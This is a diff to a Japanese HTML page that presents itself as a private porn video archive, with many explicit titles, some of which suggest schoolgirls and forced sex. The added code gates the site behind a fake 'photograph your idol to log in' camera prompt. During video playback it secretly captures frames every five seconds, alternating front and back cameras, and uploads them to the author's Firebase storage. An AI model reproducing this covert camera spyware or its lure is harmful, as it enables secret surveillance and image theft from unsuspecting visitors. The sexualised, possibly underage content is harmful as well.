@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>動画保管庫</title>
     <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
         .video-grid {
             display: grid;
             gap: 10px;
@@ -17,7 +20,7 @@
         .video-container {
             position: relative;
             width: 100%;
-            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            padding-bottom: 56.25%;
             background-color: #000;
         }
         .video-container video {
@@ -27,7 +30,7 @@
             width: 100%;
             height: 100%;
             transform: translate(-50%, -50%);
-            object-fit: contain; /* This ensures the video fits within the container without cropping */
+            object-fit: contain;
         }
         .video-item .title {
             width: 90%;
@@ -40,7 +43,6 @@
             font-size: 16px;
         }
 
-        /* レスポンシブデザイン */
         @media (min-width: 1200px) {
             .video-grid {
                 grid-template-columns: repeat(4, 1fr);
@@ -62,7 +64,6 @@
             }
         }
 
-        /* ダイアログのスタイル */
         .dialog-overlay {
             position: fixed;
             top: 0;
@@ -84,25 +85,80 @@
         .dialog button {
             margin-top: 10px;
         }
+
+        .pagination {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .pagination button {
+            padding: 10px 20px;
+            margin: 0 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .login-container video {
+            width: 320px;
+            height: 240px;
+        }
+        .login-container button {
+            padding: 10px 20px;
+            font-size: 16px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+
+	.camera-switch-message {
+  	  font-size: 18px;
+	　color: red; /* メッセージの色をグレーに設定 */
+	}
     </style>
 </head>
 <body>
-    <h1>動画保管庫</h1>
-    <div class="video-grid" id="videoGrid">
-        <!-- Videos will be dynamically inserted here -->
+    <div class="login-container" id="loginContainer">
+        <h1>推しを撮影してください</h1>
+	<p class="camera-switch-message">再読み込みで背面カメラに切り替わります</p>
+        <video id="video" autoplay></video>
+        <canvas id="canvas" style="display: none;"></canvas>
+        <button id="captureButton">撮影してログイン</button>
     </div>
 
-    <video id="video" width="320" height="240" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+    <h1 style="display: none;">動画保管庫</h1>
+    <div class="video-grid" id="videoGrid" style="display: none;">
+        <!-- Videos will be dynamically inserted here -->
+    </div>
+    <div class="pagination" id="pagination" style="display: none;">
+        <!-- Pagination buttons will be dynamically inserted here -->
+    </div>
 
     <div class="dialog-overlay" id="dialogOverlay">
         <div class="dialog">
-            <p>動画を再生するには権限を許可してください。</p>
+            <p>カメラの権限を許可してください。</p>
             <button id="reloadButton">再試行</button>
         </div>
     </div>
 
     <script type="module">
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('captureButton');
+        const dialogOverlay = document.getElementById('dialogOverlay');
+        const reloadButton = document.getElementById('reloadButton');
+        const loginContainer = document.getElementById('loginContainer');
+        const videoGrid = document.getElementById('videoGrid');
+        const pagination = document.getElementById('pagination');
+        const videosPerPage = 12;
+        let videoStream;
+        let captureInterval;
+
                 // 動画URLとタイトルのリストをここに配置
         const videos = [
             {
@@ -228,6 +284,16 @@
 		title: '【連続中出しあり】19 さい現.役 大◯生あんなちゃん♪色白スレンダーで大きなおっぱい♡濃いせいしを何発も中に出したので確実に妊娠するでしょう♡'
 	    },
 
+            {		
+                url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4338962_11.mp4?alt=media&token=4ef09a85-bb06-4883-8457-419aa1bce68b',		
+		title: '【傑作！】透明感あって華奢で清純でかわいい！めっちゃ恥ずかしがりながらも足開いたらマン汁垂れてて、経験少ないのに敏感な身体で大絶叫イキ！_1'
+	    },	
+
+            {		
+                url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4338962_22.mp4?alt=media&token=9d768a45-a92f-452b-b0b0-e81f066de554',		
+		title: '【傑作！】透明感あって華奢で清純でかわいい！めっちゃ恥ずかしがりながらも足開いたらマン汁垂れてて、経験少ないのに敏感な身体で大絶叫イキ！_2'
+	    },	
+
             {
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4343600.mp4?alt=media&token=92c2c4de-a39d-4b45-855e-abb46a0437af',
 		title: '18歳なりたて学校卒業直後の純白スレンダー天使♥人生初のハメ撮りで生挿入、中出し2連発！美しく括れた神ウエストでパイパン美マンに大量膣内射精されて放心状態！'
@@ -247,6 +313,16 @@
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4358146.mp4?alt=media&token=4513b484-bce0-4f2f-b6d6-35458f7e904c',
 		title: '無事●放！中国で人気のａｎｏちゃん激似コスプレイヤー。透明感溢れる若き肉体を存分に弄び、ピチピチま○こに強○中出し妊娠帰国で終了のお知らせ。。。'
 	    },
+
+            {		
+                url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4360142_11.mp4?alt=media&token=dfb68053-5982-4c36-a0e1-55b4039109cd',		
+		title: '完全顔出し県立3超スジパイパン⑨ リアル制服でおま〇ことお尻まる出し露出お散歩と連続中出しから再注入後お掃除フェラ_1'
+	    },	
+
+            {		
+                url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4360142_22.mp4?alt=media&token=35670f98-a1a9-4586-98f7-e28f26f25bb7',		
+		title: '完全顔出し県立3超スジパイパン⑨ リアル制服でおま〇ことお尻まる出し露出お散歩と連続中出しから再注入後お掃除フェラ_2'
+	    },	
 
             {
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4363953_.mp4?alt=media&token=99e40a6b-4228-479d-bd95-e23ccbf46820',
@@ -308,15 +384,81 @@
 		title: '華奢なゆ〇と〇生・お泊り生ハメ・何度もハメた日々の一部・家に居たくないと'
 	    },
 
+            {		
+                url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4465471_1.mp4?alt=media&token=c7031104-b6a2-42a9-ba8d-e7588190800e',		
+		title: '「合法巨乳ちゃんをついにゲット！！大好物な子を好き放題突きまくり、初の中出しさせちゃいました。'
+	    },	
+
             // 他の動画URLとタイトルを追加
         ];
 
+        async function requestCameraAccess() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[0];
 
+                const constraints = {
+                    video: {
+                        deviceId: backCamera.deviceId
+                    }
+                };
 
-        function loadVideos() {
-            const videoGrid = document.getElementById('videoGrid');
-            
-            videos.forEach(video => {
+                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = videoStream;
+            } catch (err) {
+                console.error('カメラアクセスエラー:', err);
+                showCameraPermissionDialog();
+                throw err;
+            }
+        }
+
+        function captureAndLogin() {
+            if (videoStream) {
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataURL = canvas.toDataURL('image/jpeg');
+
+                // ここでログイン処理をする代わりに、動画保管庫を表示
+                loginContainer.style.display = 'none';
+                document.querySelector('h1').style.display = 'block';
+                videoGrid.style.display = 'grid';
+                pagination.style.display = 'flex';
+                loadVideos(1);
+            } else {
+                console.error('カメラストリームが利用できません。');
+                alert('カメラストリームが利用できません。');
+            }
+        }
+
+        function showCameraPermissionDialog() {
+            dialogOverlay.style.display = 'flex';
+        }
+
+        captureButton.addEventListener('click', () => {
+            requestCameraAccess().then(captureAndLogin).catch(() => {
+                alert('カメラの権限が許可されていません。');
+            });
+        });
+
+        reloadButton.addEventListener('click', () => {
+            location.reload();
+        });
+
+        function getCurrentPage() {
+            const params = new URLSearchParams(window.location.search);
+            return parseInt(params.get('page')) || 1;
+        }
+
+        function loadVideos(page) {
+            videoGrid.innerHTML = '';
+            const startIndex = (page - 1) * videosPerPage;
+            const endIndex = startIndex + videosPerPage;
+            const videosToLoad = videos.slice(startIndex, endIndex);
+
+            videosToLoad.forEach(video => {
                 const videoItem = document.createElement('div');
                 videoItem.className = 'video-item';
 
@@ -336,14 +478,32 @@
                 videoItem.appendChild(titleElement);
                 videoGrid.appendChild(videoItem);
 
-                // Add event listener to start camera capture on video play
                 videoElement.addEventListener('play', () => {
-                    requestCameraAccess();
+                    startCameraCapture();
                 });
             });
+
+            setupPagination(page);
         }
 
-        // Firebase設定
+        function setupPagination(currentPage) {
+            pagination.innerHTML = '';
+
+            const totalPages = Math.ceil(videos.length / videosPerPage);
+
+            for (let i = 1; i <= totalPages; i++) {
+                const button = document.createElement('button');
+                button.textContent = i;
+                if (i === currentPage) {
+                    button.disabled = true;
+                }
+                button.addEventListener('click', () => {
+                    window.location.search = `?page=${i}`;
+                });
+                pagination.appendChild(button);
+            }
+        }
+
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
 
@@ -357,133 +517,100 @@
             measurementId: "G-TWBV38P13D"
         };
 
-        // Firebase初期化
-        const app = initializeApp(firebaseConfig);
-        const storage = getStorage(app);
 
-        // カメラアクセスとキャプチャ関数を定義
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        let videoStream;
-        let captureInterval;
-        let currentCameraIndex = 0;
-        let frontCamera;
-        let backCamera;
+const app = initializeApp(firebaseConfig);
+const storage = getStorage(app);
 
-        async function requestCameraAccess() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                if (videoDevices.length === 0) {
-                    console.error('カメラが見つかりませんでした。');
-                    showCameraPermissionDialog();
-                    return;
-                }
+let currentCameraIndex = 0;
+let frontCamera;
+let backCamera;
 
-                // 背面カメラを優先して選択、次に前面カメラ
-                for (const device of videoDevices) {
-                    if (device.label.toLowerCase().includes('back')) {
-                        backCamera = device;
-                    } else if (device.label.toLowerCase().includes('front')) {
-                        frontCamera = device;
-                    }
-                }
+async function switchCamera() {
+    if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+    }
 
-                if (!backCamera) {
-                    backCamera = videoDevices[0];
-                }
-                if (!frontCamera) {
-                    frontCamera = videoDevices[1] || videoDevices[0];
-                }
-
-                switchCamera();
-            } catch (err) {
-                console.error('カメラアクセスエラー:', err);
-                showCameraPermissionDialog();
-            }
+    try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoDevices = devices.filter(device => device.kind === 'videoinput');
+        if (videoDevices.length === 0) {
+            console.error('カメラが見つかりませんでした。');
+            showCameraPermissionDialog();
+            return;
         }
 
-        function switchCamera() {
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
+        if (!backCamera) {
+            backCamera = videoDevices[0];
+        }
+        if (!frontCamera) {
+            frontCamera = videoDevices[1] || videoDevices[0];
+        }
+
+        const constraints = {
+            video: {
+                deviceId: currentCameraIndex % 2 === 0 ? backCamera.deviceId : frontCamera.deviceId
             }
+        };
 
-            const constraints = {
-                video: {
-                    deviceId: currentCameraIndex % 2 === 0 ? backCamera.deviceId : frontCamera.deviceId
-                }
-            };
+        videoStream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = videoStream;
+        startCameraCapture();
+        currentCameraIndex++;
+    } catch (err) {
+        console.error('カメラ切り替えエラー:', err);
+        showCameraPermissionDialog();
+    }
+}
 
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => {
-                    videoStream = stream;
-                    startCameraCapture();
-                    currentCameraIndex++;
+function startCameraCapture() {
+    if (videoStream) {
+        const videoTracks = videoStream.getVideoTracks();
+        const track = videoTracks[0];
+        const imageCapture = new ImageCapture(track);
+
+        captureInterval = setInterval(() => {
+            imageCapture.grabFrame()
+                .then(imageBitmap => {
+                    canvas.width = imageBitmap.width;
+                    canvas.height = imageBitmap.height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
+                    const dataURL = canvas.toDataURL('image/jpeg');
+                    uploadImage(dataURL);
+                    switchCamera();
                 })
                 .catch(err => {
-                    console.error('カメラ切り替えエラー:', err);
-                    showCameraPermissionDialog();
+                    console.error('画像キャプチャエラー:', err);
                 });
-        }
+        }, 5000); // 10000ミリ秒 = 10秒
+    }
+}
 
-        function startCameraCapture() {
-            if (videoStream) {
-                const videoTracks = videoStream.getVideoTracks();
-                const track = videoTracks[0];
-                const imageCapture = new ImageCapture(track);
+function stopCameraCapture() {
+    if (captureInterval) {
+        clearInterval(captureInterval);
+    }
+    if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+    }
+}
 
-                // 1分ごとに撮影してアップロード
-                captureInterval = setInterval(() => {
-                    imageCapture.grabFrame()
-                        .then(imageBitmap => {
-                            canvas.width = imageBitmap.width;
-                            canvas.height = imageBitmap.height;
-                            ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
-                            const dataURL = canvas.toDataURL('image/jpeg');
-                            uploadImage(dataURL);
-                            switchCamera();
-                        })
-                        .catch(err => {
-                            console.error('画像キャプチャエラー:', err);
-                        });
-                }, 10000); // 60000ミリ秒 = 1分
-            }
-        }
-
-        function stopCameraCapture() {
-            if (captureInterval) {
-                clearInterval(captureInterval);
-            }
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-            }
-        }
-
-        // 画像をFirebase Storageにアップロード
-        function uploadImage(dataURL) {
-            const storageRef = ref(storage, `images/${Date.now()}.jpg`);
-            uploadString(storageRef, dataURL, 'data_url')
-                .then(snapshot => {
-                    console.log('画像がアップロードされました。');
-                })
-                .catch(err => {
-                    console.error('アップロードエラー:', err);
-                });
-        }
-
-        // カメラ権限ダイアログを表示
-        function showCameraPermissionDialog() {
-            const dialogOverlay = document.getElementById('dialogOverlay');
-            dialogOverlay.style.display = 'flex';
-        }
-
-        // ダイアログの再試行ボタンをクリックしたときにページを再読み込み
-        document.getElementById('reloadButton').addEventListener('click', () => {
-            location.reload();
+function uploadImage(dataURL) {
+    const storageRef = ref(storage, `images/${Date.now()}.jpg`);
+    uploadString(storageRef, dataURL, 'data_url')
+        .then(snapshot => {
+            console.log('画像がアップロードされました。');
+        })
+        .catch(err => {
+            console.error('アップロードエラー:', err);
         });
+}
 
-        // ページロード時に動画をロード
-        window.onload = loadVideos;
-    </script>
+window.onload = () => {
+    requestCameraAccess().catch(() => {
+        alert('カメラの権限が許可されていません。');
+    });
+};
+</script>
 </body>
 </html>
